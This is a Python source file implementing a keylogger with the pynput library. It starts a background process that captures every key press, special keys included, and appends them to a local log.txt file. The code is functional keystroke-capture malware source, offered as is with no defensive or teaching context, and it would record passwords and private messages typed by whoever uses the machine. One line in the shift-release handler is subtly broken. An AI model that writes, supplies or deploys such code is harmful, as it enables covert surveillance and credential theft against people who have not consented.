"""Functions for running a keylogger."""

import multiprocessing as mp
import os
from pynput import keyboard

LOG_FILE_NAME = 'log.txt'
_keylogger_process = None
_shift_is_pressed = False

def parse_special_key(key) -> str:
  """Gets the character representation of the given key.

  Some function keys will be ignored.

  Args:
    key: The key to get a string representation of.
  """
  global _shift_is_pressed
  if key == keyboard.Key.backspace:
    return '<BACKSPACE>'
  elif key == keyboard.Key.caps_lock:
    return '<CAPS_LOCK>'
  elif key == keyboard.Key.delete:
    return '<DELETE>'
  elif key == keyboard.Key.enter:
    return '\n'
  elif key == keyboard.Key.space:
    return ' '
  elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
    _shift_is_pressed = True
    return ''
  else:
    return ''

def on_press(key):
  """Event listener for when keys are pressed."""
  global _shift_is_pressed
  file_mode = 'a' if os.path.isfile(LOG_FILE_NAME) else 'w'
  with open(LOG_FILE_NAME, file_mode) as log_file:
    try:
      key_type = type(key)
      if key_type == keyboard.KeyCode: # Alphanumeric keys
        log_file.write(
          key.char.upper() if _shift_is_pressed else key.char.lower()
        )
      elif key_type == keyboard.Key: # Special keys
        log_file.write(parse_special_key(key))
    except AttributeError:
      print(f'Error with: {key}')

def on_release(key) -> None:
  """Event listener for when keys are released."""
  global _shift_is_pressed
  if type(key == keyboard.Key) \
  and key in (keyboard.Key.shift, keyboard.Key.shift_r):
    _shift_is_pressed = False

def _run_keylogger() -> None:
  with keyboard.Listener(
      on_press=on_press,
      on_release=on_release
  ) as listener:
    try:
      listener.join()
    except RuntimeError as err:
      print(err)

def start_keylogger():
  """Create process for running the keylogger."""
  global _keylogger_process
  _keylogger_process = mp.Process(target=_run_keylogger)
  _keylogger_process.start()

def stop_keylogger():
  global _keylogger_process
  if _keylogger_process is not None:
    _keylogger_process.terminate()
    _keylogger_process = None
